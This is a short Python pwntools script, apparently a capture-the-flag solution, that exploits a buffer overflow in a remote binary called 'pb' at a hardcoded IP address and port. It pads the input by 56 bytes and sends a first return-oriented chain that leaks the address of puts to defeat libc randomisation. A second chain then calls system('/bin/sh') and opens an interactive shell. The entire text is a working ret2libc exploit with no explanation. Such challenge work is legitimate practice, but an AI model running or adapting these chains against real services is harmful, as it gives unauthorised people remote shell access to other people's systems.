from pwn import *

exe = ELF('./pb')
libc = ELF('./libc.so.6')
io = remote('68.183.37.122', 30673)
#io = exe.process()
#gdb.attach(io, api=True)
# Gadgets:
pad = b'i'*56
pop_rdi = 0x000000000040142b
binsh = 0x1d8698
ret = 0x00000000004013a5

# 1st chain leak libc
io.recvuntil(b'\n>> ')
io.sendline(b'2')
io.recvuntil(b'library: ')
payload = pad + p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main'])
io.sendline(payload)
io.recvuntil(b'thank you!\n\n')
leak_puts = u64(io.recvline(keepends=False).ljust(8, b'\x00'))
libc.address = leak_puts - libc.sym['puts']

# 2nd chain get shell
io.recvuntil(b'\n>> ')
io.sendline(b'2')
io.recvuntil(b'library: ')
print(hex(libc.sym['system']))
payload = pad + p64(ret) + p64(pop_rdi) + p64(libc.address + binsh) + p64(libc.sym['system'])
io.sendline(payload)

io.interactive()